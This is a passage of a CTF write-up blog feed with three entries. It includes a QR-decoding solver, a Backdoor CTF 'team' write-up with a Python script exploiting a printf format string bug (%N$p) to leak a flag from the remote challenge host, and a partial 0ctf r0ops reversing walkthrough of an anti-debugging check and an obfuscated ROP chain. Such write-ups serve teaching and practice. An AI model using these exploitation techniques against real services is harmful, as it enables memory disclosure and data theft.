</span><span class='line'>          <span class="n">x</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>      <span class="k">if</span> <span class="nb">ord</span><span class="p">(</span><span class="n">qr</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">==</span> <span class="mh">0x20</span><span class="p">:</span>
</span><span class='line'>          <span class="n">pixels</span><span class="p">[</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">)</span>
</span><span class='line'>          <span class="n">pixels</span><span class="p">[</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">)</span>
</span><span class='line'>          <span class="n">x</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>      <span class="k">if</span> <span class="nb">ord</span><span class="p">(</span><span class="n">qr</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">==</span> <span class="mh">0xa</span><span class="p">:</span>
</span><span class='line'>          <span class="n">x</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>          <span class="n">y</span> <span class="o">+=</span> <span class="mi">2</span>
</span><span class='line'>      <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># write out QR to disk  </span>
</span><span class='line'>  <span class="n">im</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="s">&#39;qr.png&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># ugly hack because ctf</span>
</span><span class='line'>  <span class="n">popen</span><span class="p">(</span><span class="s">&#39;zbarimg ./qr.png &gt; qr.out&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;qr.out&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span><span class='line'>      <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
</span><span class='line'>      <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r&#39;Code:([0-9a-f]*)&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">m</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>  
</span><span class='line'><span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
</span><span class='line'>  <span class="k">global</span> <span class="n">s</span>
</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&quot;hack.bckdr.in&quot;</span><span class="p">,</span> <span class="mi">8010</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;can&#39;</span><span class="p">)</span> <span class="c"># banner</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">try</span><span class="p">:</span>
</span><span class='line'>      <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
</span><span class='line'>          <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'>          <span class="n">qr</span> <span class="o">=</span> <span class="n">readtil</span><span class="p">(</span><span class="n">b</span><span class="s">&#39;</span><span class="se">\x0a</span><span class="s">                                          &#39;</span><span class="p">)</span>
</span><span class='line'>          <span class="c">#print qr</span>
</span><span class='line'>          <span class="n">sendln</span><span class="p">(</span><span class="n">getQR</span><span class="p">(</span><span class="n">qr</span><span class="p">))</span>
</span><span class='line'>          <span class="n">response</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>          <span class="k">print</span> <span class="n">response</span>
</span><span class='line'>  <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
</span><span class='line'>      <span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'>      <span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'>      <span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span><span class='line'>      <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>  
</span><span class='line'><span class="n">pwn</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>The script was receiving and decoding QR codes quite rapidly, but I didn&rsquo;t receive any flags. I finally just fired up <code>wireshark</code> to grab the flag from the TCP stream:</p>

<p><img src="http://barrebas.github.io/assets/bckdr/qr-01.png" alt="" /></p>

<p>Not the most elegant way to grab the flag, but hey, it worked.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Backdoor CTF - Team]]></title>
    <link href="http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-team/"/>
    <updated>2015-04-02T19:23:27+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-team</id>
    <content type="html"><![CDATA[<p>Backdoor CTF was hosted on a weekday, so we only had the evening to grab as many flags as we could. Here&rsquo;s how we solved <code>team</code> for 600 points.</p>

<!-- more -->


<p>The binary we&rsquo;ve been given is a 32-bit ELF. The output of strings doesn&rsquo;t give us much. Using <code>strace ./team</code>, it becomes clear that the binary reads from <code>flag.txt</code> so I created one locally. I echoed <code>flag1</code> to the file and restarted the binary.</p>

<p>It asks for a team name and a flag. After receiving these values in heap buffers (non-overflowable as far as I could gather) it proceeds to read the flag from <code>flag.txt</code>. Then, it compares the user input to the flag using <code>strcmp</code>.</p>

<p>The team name is then printed using <code>printf</code>: this is vulnerable to a format string vulnerability:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bas@tritonal:~/tmp/bckdr/team-600$ ./team
</span><span class='line'>Enter teamname: TEAM%llp
</span><span class='line'>Enter flag: FLAG%llp
</span><span class='line'>TEAM0x64 : incorrect flag. Try again.</span></code></pre></td></tr></table></div></figure>


<p>Okay, so let&rsquo;s have a look at the stack when we reach <code>printf</code>. It gets called at <code>8048711</code> to print the team name.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Breakpoint 1, 0x08048711 in ?? ()
</span><span class='line'>gdb-peda$ x/40wx $esp
</span><span class='line'>0xffffd510:   0x0804b008  0x00000064  0x0804b140  0x00000000
</span><span class='line'>0xffffd520:   0x00000000  0x00000000  0x0804b0d8  0x0804b008
</span><span class='line'>0xffffd530:   0x00000000  0x0804b140  0x67616c66  0x00000031
</span><span class='line'>0xffffd540:   0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0xffffd550:   0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0xffffd560:   0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0xffffd570:   0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0xffffd580:   0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0xffffd590:   0x00000000  0x00000002  0x00000000  0x856b7a00
</span><span class='line'>0xffffd5a0:   0x00000000  0x00000000  0xffffd5d8  0x0804880c</span></code></pre></td></tr></table></div></figure>


<p>What&rsquo;s this then? From breakpointing <code>strcmp</code>, I learned that the flag was on the stack. In fact, it&rsquo;s within reach of the format string vulnerability!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0xffffd530:  0x00000000  0x0804b140  0x67616c66  0x00000031
</span><span class='line'>                          flag1 &gt;&gt;&gt;   g a l f           1</span></code></pre></td></tr></table></div></figure>


<p>That&rsquo;s too easy, right? Wrong! The flag starts at <code>%10$p</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/bckdr/team-600<span class="nv">$ </span>./team
</span><span class='line'>Enter teamname: %10<span class="nv">$p</span>
</span><span class='line'>Enter flag: bleh
</span><span class='line'>0x67616c66 : incorrect flag. Try again.
</span></code></pre></td></tr></table></div></figure>


<p>It worked remotely with this script:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">telnetlib</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">sys</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">readtil</span><span class="p">(</span><span class="n">delim</span><span class="p">):</span>
</span><span class='line'>  <span class="n">buf</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;&#39;</span>
</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">delim</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">:</span>
</span><span class='line'>      <span class="n">buf</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">buf</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">sendln</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">b</span> <span class="o">+</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">sendbin</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="k">def</span> <span class="nf">pwn</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
</span><span class='line'>  <span class="k">global</span> <span class="n">s</span>
</span><span class='line'>  <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;hack.bckdr.in&#39;</span><span class="p">,</span> <span class="mi">8004</span><span class="p">))</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;teamname: &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&quot;AAAA%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">n</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;$p&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;flag: &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&quot;CTF_TEAM_VULNHUB&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;again.&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>  <span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r&#39;0x([0-9a-f]*) :&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">m</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>  
</span><span class='line'><span class="n">full</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">30</span><span class="p">):</span>
</span><span class='line'>  <span class="n">full</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&#39;hex&#39;</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>  <span class="k">print</span> <span class="n">full</span>
</span></code></pre></td></tr></table></div></figure>


<p>This spits out the flag until it hits something it can&rsquo;t hex decode. Because the CTF is long-lived, we won&rsquo;t post any flags.</p>

<p>Far too easy for a 600 point challenge, but we&rsquo;re not complaining&hellip;</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[0ctf - R0ops]]></title>
    <link href="http://barrebas.github.io/blog/2015/03/30/0ctf-r0ops/"/>
    <updated>2015-03-30T21:15:09+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/03/30/0ctf-r0ops</id>
    <content type="html"><![CDATA[<p><code>r0ops</code> was a reversing challenge, worth only 150 points. Based on the amount of points, I expected it to be relatively easy, but I was in for a ride down the rabbit hole&hellip;</p>

<!-- more -->


<p></p>

<p>The binary opens binds to a port and waits for incoming connections. Upon connecting with <code>nc</code>, nothing much happens. While trying to run it in <code>gdb</code>, I encountered the first anti-debugger trick:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>;;; nice anti-debugger code
</span><span class='line'> dead448: ba 00 00 00 00          mov    edx,0x0
</span><span class='line'> dead44d: be 01 00 00 00          mov    esi,0x1
</span><span class='line'> dead452: bf 02 00 00 00          mov    edi,0x2
</span><span class='line'> dead457: e8 c4 32 55 f2          call   400720 &lt;socket@plt&gt;
</span><span class='line'> dead45c: 89 45 fc                mov    DWORD PTR [rbp-0x4],eax
</span><span class='line'> dead45f: 83 7d fc 03             cmp    DWORD PTR [rbp-0x4],0x3      ; anti-gdb trick
</span><span class='line'> dead463: 74 07                   je     dead46c &lt;div+0x320&gt;
</span><span class='line'> dead465: b8 00 00 00 00          mov    eax,0x0
</span><span class='line'> dead46a: eb 50                   jmp    dead4bc &lt;div+0x370&gt;</span></code></pre></td></tr></table></div></figure>


<p><code>gdb</code> opens more file descriptors. The binary rightly expects the socket handle to be file descriptor 3; if it encounter anything else, it must be because <code>gdb</code> is running.</p>

<p>Examing the output of <code>objdump</code>, I quickly learned that the main program is just a stub to load a ROP chain:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ;;; accept calls
</span><span class='line'> dead3af: eb 02                   jmp    dead3b3 &lt;div+0x267&gt;
</span><span class='line'> dead3b1: 52                      push   rdx
</span><span class='line'> dead3b2: f2 48 83 ec 10          repnz sub rsp,0x10
</span><span class='line'> dead3b7: ba 00 00 00 00          mov    edx,0x0
</span><span class='line'> dead3bc: be 00 00 00 00          mov    esi,0x0
</span><span class='line'> dead3c1: bf 03 00 00 00          mov    edi,0x3
</span><span class='line'> dead3c6: e8 45 33 55 f2          call   400710 &lt;accept@plt&gt;
</span><span class='line'> dead3cb: 89 45 fc                mov    DWORD PTR [rbp-0x4],eax
</span><span class='line'> dead3ce: 8b 45 fc                mov    eax,DWORD PTR [rbp-0x4]
</span><span class='line'> dead3d1: b9 00 00 00 00          mov    ecx,0x0
</span><span class='line'> dead3d6: ba 00 10 00 00          mov    edx,0x1000
</span><span class='line'> dead3db: be c0 10 0b 0e          mov    esi,0xe0b10c0
</span><span class='line'> dead3e0: 89 c7                   mov    edi,eax
</span><span class='line'> dead3e2: e8 89 32 55 f2          call   400670 &lt;recv@plt&gt;
</span><span class='line'> dead3e7: 8b 45 fc                mov    eax,DWORD PTR [rbp-0x4]
</span><span class='line'> dead3ea: 89 c7                   mov    edi,eax
</span><span class='line'> dead3ec: b8 00 00 00 00          mov    eax,0x0
</span><span class='line'> dead3f1: e8 ca 32 55 f2          call   4006c0 &lt;close@plt&gt;
</span><span class='line'> dead3f6: ba a0 f0 0a 0e          mov    edx,0xe0af0a0
</span><span class='line'> dead3fb: be a0 00 0b 0e          mov    esi,0xe0b00a0
</span><span class='line'> dead400: b8 00 02 00 00          mov    eax,0x200
</span><span class='line'> dead405: 48 89 d7                mov    rdi,rdx
</span><span class='line'> dead408: 48 89 c1                mov    rcx,rax
</span><span class='line'> dead40b: f3 48 a5                rep movs QWORD PTR es:[rdi],QWORD PTR ds:[rsi]
</span><span class='line'> dead40e: b8 c0 10 0b 0e          mov    eax,0xe0b10c0
</span><span class='line'> dead413: 48 89 c7                mov    rdi,rax                  ; input from socket
</span><span class='line'> dead416: b8 c0 20 0b 0e          mov    eax,0xe0b20c0            ; storage
</span><span class='line'> dead41b: 48 89 c6                mov    rsi,rax
</span><span class='line'> dead41e: b8 a0 f8 0a 0e          mov    eax,0xe0af8a0            ; contains a lot of addresses...
</span><span class='line'> dead423: 48 89 c4                mov    rsp,rax                  ; it's a ROP chain!
</span><span class='line'> dead426: c3                      ret                             ; this generates a new program & jumps to it
</span><span class='line'> dead427: c9                      leave  
</span><span class='line'> dead428: c3                      ret                             </span></code></pre></td></tr></table></div></figure>


<p>I set a breakpoint at the <code>ret</code> instruction, just before the ROP chain kicks off. I then dumped and copied the ROP chain and used some shell-fu to clean up the output:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>head stackdump
</span><span class='line'>0xe0af8a0:    0x0dead1f4  0x00000000  0x00000008  0x00000000
</span><span class='line'>0xe0af8b0:    0x0dead271  0x00000000  0xbeef0095  0x1337dead
</span><span class='line'>0xe0af8c0:    0x0dead123  0x00000000  0x0dead0ed  0x00000000
</span><span class='line'>0xe0af8d0:    0x0dead204  0x00000000  0x0dead267  0x00000000
</span><span class='line'>0xe0af8e0:    0x0dead0f8  0x00000000  0x0dead103  0x00000000
</span><span class='line'>0xe0af8f0:    0x0dead0ed  0x00000000  0x0dead27a  0x00000000
</span><span class='line'>0xe0af900:    0x0dead20e  0x00000000  0x0dead0f8  0x00000000
</span><span class='line'>0xe0af910:    0x0dead1ec  0x00000000  0x0000cafe  0x00000000
</span><span class='line'>0xe0af920:    0x0dead141  0x00000000  0x0dead0ed  0x00000000
</span><span class='line'>0xe0af930:    0x0dead204  0x00000000  0x0dead284  0x00000000
</span><span class='line'><span class="nv">$ </span>cat stackdump <span class="p">|</span> sed <span class="s1">&#39;s/0x//g&#39;</span> <span class="p">|</span> awk <span class="s1">&#39;{print $3 $2&quot;\n&quot; $5 $4}&#39;</span> &gt; ropchain
</span></code></pre></td></tr></table></div></figure>


<p>Now, the ropchain contained only bare addresses. This is were the second obfuscation step came into place: each ROP gadget starts with a <code>jmp</code> which jumps in the middle of another instruction. Because of this, the disassembly cannot be trusted. Instead, I manually looked up all the ROP gadgets and pieced them together. The ROP chain is quite ingenious, although it also contains tons of redundant instruction:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>000000000dead1f4 pop rcx
</span><span class='line'>0000000000000008
</span><span class='line'>000000000dead271  pop r9                          <span class="p">;</span> <span class="nv">r9</span> <span class="o">=</span> 1337deadbeef0095
</span><span class='line'>1337deadbeef0095
</span><span class='line'>000000000dead123  mov    rax,QWORD PTR <span class="o">[</span>rdi<span class="o">]</span>      <span class="p">;</span> <span class="o">[</span>rdi+0<span class="o">]</span> first QWORD of input
</span><span class='line'>000000000dead0ed  add    rsi,0x8                  <span class="p">;</span> <span class="nv">rsi</span><span class="o">=</span>8
</span><span class='line'>000000000dead204  mov    QWORD PTR <span class="o">[</span>rsi<span class="o">]</span>,rax      <span class="p">;</span> <span class="nv">rsi</span><span class="o">=</span>8
</span><span class='line'>000000000dead267  mov    r8,QWORD PTR <span class="o">[</span>rsi<span class="o">]</span>       <span class="p">;</span> <span class="nv">rsi</span><span class="o">=</span><span class="m">8</span> <span class="nv">r8</span> <span class="o">=</span> first QWORD of input
</span><span class='line'>000000000dead0f8  sub    rsi,0x8                  <span class="p">;</span> <span class="nv">rsi</span><span class="o">=</span>0
</span><span class='line'>000000000dead103  add    rdi,0x8                  <span class="p">;</span> <span class="nv">rdi</span><span class="o">=</span>8
</span><span class='line'>000000000dead0ed  add    rsi,0x8                  <span class="p">;</span> <span class="nv">rsi</span><span class="o">=</span><span class="m">8</span> <span class="o">(</span>no-op<span class="o">)</span>
</span><span class='line'>000000000dead27a  mov    QWORD PTR <span class="o">[</span>rsi<span class="o">]</span>,r9       <span class="p">;</span> <span class="nv">rsi</span><span class="o">=</span><span class="m">8</span> <span class="o">[</span>rsi<span class="o">]</span> <span class="o">=</span> 1337deadbeef0095
</span><span class='line'>000000000dead20e  mov    rax,QWORD PTR <span class="o">[</span>rsi<span class="o">]</span>      <span class="p">;</span> <span class="nv">rsi</span><span class="o">=</span><span class="m">8</span> <span class="nv">rax</span> <span class="o">=</span> 1337deadbeef0095
</span><span class='line'>000000000dead0f8  sub    rsi,0x8                  <span class="p">;</span> <span class="nv">rsi</span><span class="o">=</span>0
</span><span class='line'>000000000dead1ec  pop    rbx                      <span class="p">;</span> <span class="nv">rbx</span> <span class="o">=</span> cafe
</span><span class='line'>000000000000cafe
</span><span class='line'>000000000dead141  imul   rax,rbx                  <span class="p">;</span> <span class="nv">rax</span> <span class="o">==</span>&gt; 0x2724090c079825d6
</span><span class='line'>000000000dead0ed  add    rsi,0x8                  <span class="p">;</span> <span class="nv">rsi</span><span class="o">=</span>8
</span><span class='line'>000000000dead204  mov    QWORD PTR <span class="o">[</span>rsi<span class="o">]</span>,rax      <span class="p">;</span> <span class="nv">rax</span> <span class="o">=</span> 0x1337deadbeef0095*0xcafe
</span><span class='line'>...continues...
</span></code></pre></td></tr></table></div></figure>


<p>It basically takes the first QWORD of the input, sent over the socket, and then proceeds to generate a special constant. This is used later to compare against. I followed the rest of the ROP chain, and it basically does the following: it repeatedly multiplies the QWORD of our input with itself. At set intervals, it will multiply this value with the original QWORD. After a fixed number of iterations, it compares the resulting QWORD to the generated magic constant. The ROP chain uses a clever mechanism to implement conditional looping:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>000000000dead1ec pop    rbx                      <span class="p">;</span> <span class="nv">rbx</span><span class="o">=</span>0
</span><span class='line'>0000000000000000
</span><span class='line'>000000000dead1fc  pop    rdx                      <span class="p">;</span> <span class="nv">rdx</span><span class="o">=</span>1d8<span class="p">;</span> adjustment <span class="k">for</span> rsp!
</span><span class='line'>00000000000001d8                                    <span class="p">;</span>
</span><span class='line'>000000000dead19b  0xdead19f:  cmp    rax,rbx      <span class="p">;</span> rax contains a counter used to iterate<span class="p">;</span>
</span><span class='line'>                  0xdead1a2:  jne    0xdead1a7    <span class="p">;</span> -&gt; ret<span class="p">;</span> <span class="k">if</span> rax !<span class="o">=</span> rbx, <span class="k">continue</span>
</span><span class='line'>                  0xdead1a4:  add    rsp,rdx      <span class="p">;</span> when it reaches zero, control is passed to the next gadget, located at rsp+0x1d8
</span></code></pre></td></tr></table></div></figure>


<p>Clever stuff, but horrible to trace. There were a lot of jumps and no ops to throw me off. For instance, a gadget would <code>add rsi, 8</code> and the next one would <code>sub rsi, 8</code>, effectively doing nothing (except annoying me and wearing out my Enter key).</p>

<h2>Breaking the chain</h2>

<p>The ROP chain repeats this process eight times, so we need to send eight QWORDS over the socket. For each QWORD, a new magic constant is generated (taking the former value, multiplying by <code>0xcafe</code> and adding <code>0xbeef</code>). To inspect what was going on, I set breakpoints on two very important ROP gadgets:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Breakpoint 1, 0x000000000dead145 in ?? <span class="o">()</span>
</span><span class='line'>1: x/i <span class="nv">$rip</span>
</span><span class='line'><span class="o">=</span>&gt; 0xdead145:   imul   rax,rbx
</span><span class='line'>
